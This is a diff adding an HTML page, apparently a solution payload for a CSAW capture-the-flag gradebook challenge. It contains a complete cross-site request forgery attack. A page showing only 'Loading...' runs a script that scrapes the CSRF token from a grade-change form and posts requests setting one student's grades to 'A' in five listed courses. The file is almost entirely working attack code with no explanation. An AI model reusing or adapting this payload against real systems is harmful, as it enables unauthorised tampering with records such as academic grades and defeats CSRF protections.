@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Grade Change</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        // Your student ID
+        const studentId = '936712b0-83a0-401e-9ed7-23c2fb5efda3';
+        // List of class IDs to change to 'A'
+        const classIds = [
+            'a4b983d9-5a11-4329-abbd-12ff84442187', // General Chemistry I
+            'bfb9fc0a-2036-4642-a9f3-6b744933e009	', // General Biology II
+            '5042bbaa-aae3-4bab-b841-2e7beb30c847	', // World History I
+            '0373c595-0ddb-433b-8956-10eb828c6f91	', // Calculus I
+            '768c4410-42c4-4dbf-85ee-9d1bbdf3fd88	'  // Introduction to Psychology
+        ];
+
+        // First, fetch the grade change page to get the CSRF token
+        fetch('https://gradebook-admin.ctf.csaw.io/grade-change')
+            .then(response => response.text())
+            .then(html => {
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+                const csrfToken = doc.querySelector('input[name="csrf_token"]').value;
+
+                // Now, for each class, submit a grade change request
+                let promises = classIds.map(classId => {
+                    const formData = new FormData();
+                    formData.append('student_id', studentId);
+                    formData.append('class_id', classId);
+                    formData.append('grade', 'A');
+                    formData.append('csrf_token', csrfToken);
+
+                    return fetch('https://gradebook-admin.ctf.csaw.io/grade-change', {
+                        method: 'POST',
+                        body: formData
+                    });
+                });
+
+                // Wait for all requests to complete
+                Promise.all(promises)
+                    .then(() => {
+                        alert('All grades changed to A!');
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                    });
+            });
+    </script>
+</body>
+</html>
